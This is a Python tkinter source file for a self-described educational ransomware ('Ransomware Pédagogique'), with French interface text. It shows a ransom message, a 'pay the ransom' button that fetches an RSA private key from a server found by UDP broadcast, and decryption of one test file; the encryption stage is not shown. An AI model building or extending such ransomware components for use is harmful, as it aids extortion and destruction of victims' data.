import tkinter as tk
from tkinter import messagebox
import requests
from cryptography.hazmat.primitives.asymmetric import padding
from cryptography.hazmat.primitives import serialization, hashes
from cryptography.hazmat.backends import default_backend
from decryption import decrypt_file
import os
import socket
import threading

class RansomwareGUI:
    def __init__(self, root):
        self.root = root
        self.root.title("Ransomware Pédagogique")
        self.server_ip = None
        self.ransom_button = tk.Button(root, text="Afficher le message de rançon", command=self.show_ransom_message)
        self.ransom_button.pack(pady=20)

        self.pay_button = tk.Button(root, text="Payer la rançon", command=self.request_private_key)
        self.pay_button.pack(pady=20)

        self.discover_server()

    def show_ransom_message(self):
        messagebox.showinfo("Ransomware", "Vos fichiers ont été chiffrés. Payez la rançon pour les déchiffrer.")

    def request_private_key(self):
        if not self.server_ip:
            messagebox.showerror("Erreur", "Serveur non trouvé.")
            return
        response = requests.post(f'http://{self.server_ip}:5000/get_private_key', json={'paid': True})
        if response.status_code == 200:
            private_key_pem = response.json()['private_key']
            private_key = serialization.load_pem_private_key(
                private_key_pem.encode('utf-8'),
                password=None,
                backend=default_backend()
            )
            self.decrypt_files(private_key)
        else:
            messagebox.showerror("Erreur", "Le paiement n'a pas été effectué.")

    def decrypt_files(self, private_key):
        encrypted_symmetric_key_path = os.path.join(os.path.dirname(__file__), 'keys', 'encrypted_symmetric_key.bin')
        with open(encrypted_symmetric_key_path, 'rb') as key_file:
            encrypted_symmetric_key = key_file.read()

        symmetric_key = private_key.decrypt(
            encrypted_symmetric_key,
            padding.OAEP(
                mgf=padding.MGF1(algorithm=hashes.SHA256()),
                algorithm=hashes.SHA256(),
                label=None
            )
        )

        file_path = 'example.txt'
        decrypt_file(file_path, symmetric_key)
        messagebox.showinfo("Déchiffrement", "Vos fichiers ont été déchiffrés.")

    def discover_server(self):
        def broadcast_listener():
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            sock.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1)
            sock.bind(('', 5001))
            while not self.server_ip:
                data, addr = sock.recvfrom(1024)
                if data.startswith(b'SERVER_IP:'):
                    self.server_ip = data[len(b'SERVER_IP:'):].decode()
                    print(f"Serveur trouvé à l'adresse {self.server_ip}")

        threading.Thread(target=broadcast_listener).start()
